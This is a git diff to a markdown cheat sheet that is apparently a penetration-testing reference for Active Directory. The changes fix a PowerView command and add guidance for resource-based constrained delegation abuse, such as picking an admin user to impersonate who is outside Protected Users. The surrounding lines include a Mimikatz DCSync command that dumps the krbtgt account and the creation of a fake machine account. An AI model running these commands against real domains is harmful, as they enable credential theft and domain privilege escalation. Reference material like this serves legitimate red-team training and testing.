@@ -631,7 +631,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 
 #### Check if domain controller is atleast Windows Server 2012
 ```
-Get DomainController
+Get-DomainController
 ```
 
 #### Check if target doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
@@ -658,6 +658,7 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 ```
 
 #### Get the object SID
+- If already had a user with SPN use that user, otherwise use the computer you made!
 ```
 Get-DomainComputer fake01
 Get-DomainUser <USER>
@@ -694,6 +695,8 @@ $RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoacto
 ```
 
 #### Check for user to impersonate
+- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
+- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
 Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
 ```
